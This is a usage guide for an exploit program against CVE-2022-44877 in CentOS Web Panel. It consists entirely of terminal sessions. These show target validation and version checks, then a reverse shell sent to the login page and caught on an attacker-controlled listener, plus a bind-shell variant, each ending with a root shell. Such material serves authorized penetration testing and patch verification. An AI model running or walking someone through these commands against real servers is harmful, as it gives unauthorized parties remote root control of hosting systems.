# Example Usage

## Automatic SSL Detection and Target Validation

```sh
albinolobster@mournland:~/go-exploit/examples/cve-2022-44877$ ./cve-2022-44877 -a -v -rhost 10.9.49.214
[*] Validating the remote target is a CentOS Web Panel installation
[+] Target validation succeeded!
```

## Automatic SSL Detection and Version Checking

```sh
albinolobster@mournland:~/go-exploit/examples/cve-2022-44877$ ./cve-2022-44877 -a -c -rhost 10.9.49.214
[*] Running a version check on the remote target
[-] broken.jpg has been modified since April 3, 2022. This instance *might* be vulnerable.
[*] The target *might* be a vulnerable version. Continuing.
```

## Automatic SSL Detection, Target Validation, Version Checking, and Exploitation using Default C2

```sh
albinolobster@mournland:~/go-exploit/examples/cve-2022-44877$ ./cve-2022-44877 -a -c -v -e -rhost 10.9.49.214 -lhost 10.9.49.186 -lport 1270
[*] Validating the remote target is a CentOS Web Panel installation
[+] Target validation succeeded!
[*] Running a version check on the remote target
[-] broken.jpg has been modified since April 3, 2022. This instance *might* be vulnerable.
[*] The target *might* be a vulnerable version. Continuing.
[*] Generating a TLS Certificate
[*] Starting TLS listener on 10.9.49.186:1270
[*] Sending an SSL reverse shell payload for port 10.9.49.186:1270
[+] Sending exploit to https://10.9.49.214:2031/login/index.php
[+] Caught new shell from 10.9.49.214:35868
[*] Active shell from 10.9.49.214:35868
$ whoami
sh: no job control in this shell
sh-4.2# whoami
root
$ pwd
pwd
/tmp
$ 
```

## Attacker-specified SSL and Exploitation using a non-default C2 (bind shell)

```sh
albinolobster@mournland:~/go-exploit/examples/cve-2022-44877$ ./cve-2022-44877 -s -e -rhost 10.9.49.214 -c2 SimpleShellClient -bport 1270
[*] Sending a bind shell for port 1270
[+] Sending exploit to https://10.9.49.214:2031/login/index.php
[+] Connected to 10.9.49.214:1270!
$ id
uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:unconfined_service_t:s0
$ 
```

